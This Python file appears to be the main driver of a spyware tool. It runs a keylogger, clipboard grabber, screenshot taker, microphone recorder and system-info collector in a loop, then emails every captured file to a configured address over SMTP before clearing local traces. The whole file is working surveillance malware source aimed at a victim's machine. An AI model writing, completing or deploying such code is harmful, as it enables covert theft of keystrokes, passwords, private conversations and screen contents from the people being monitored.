from time import sleep
from emailer import send
from keylogger import run as keylog
from screenshot import screenshot
from recorder import record
from clipboard import copy_clipboard
from syscon import computer_info
from multiprocessing import Process
from vars import *
import os
paths = {keys_information:key_log_path, system_information:syscon_path, clipboard_information:clipboard_path, audio_information:audio_path, screenshot_information:ss_path}

def clear_files():
    #remove files before
    global paths
    for file in paths.keys():
        if os.path.exists(f'{paths[file]}\{file}'):
            os.remove(f'{paths[file]}\{file}')
        else:
            continue
def get_text_data():
    keylogging_proc = Process(target=keylog)
    clipboard_proc = Process(target=copy_clipboard)
    clipboard_proc.start()
    keylogging_proc.start()
    clipboard_proc.join()
    keylogging_proc.join()
    computer_info()

def get_image_data():
    ss_proc = Process(target=screenshot)
    ss_proc.start()
    ss_proc.join()

def get_audio_data():
    mic_proc=Process(target=record)
    mic_proc.start()
    mic_proc.join()

def email_files():
    global paths
    for file in paths.keys():
        if os.path.exists(f'{paths[file]}\{file}'):
            #send(fromaddr,toaddr,filename,sentfile='logs.txt',password=None,smtp_server = 'smtp.gmail.com',smtp_port=587) #use this template uses gmail smtp by default change smtp_server and smtp_port for other email providers 
            #password=None takes password as input
            #sentfile sets filename by which file is sent
            send("sender@gmail.com","receiver@gmail.com",f'{paths[file]}\{file}',password='password_string',sentfile=file)
        else:
            continue

def driver():
    #Just to make code easier to read
    while True:
        clear_files()
        txt_proc = Process(target=get_text_data)
        img_proc = Process(target=get_image_data)
        audio_proc = Process(target=get_audio_data)
        txt_proc.start()
        
        img_proc.start()
        audio_proc.start()
        txt_proc.join()
        img_proc.join()
        audio_proc.join()
        email_files()
        print("Going to sleep...")
        sleep(5)

if __name__ == '__main__':
    driver()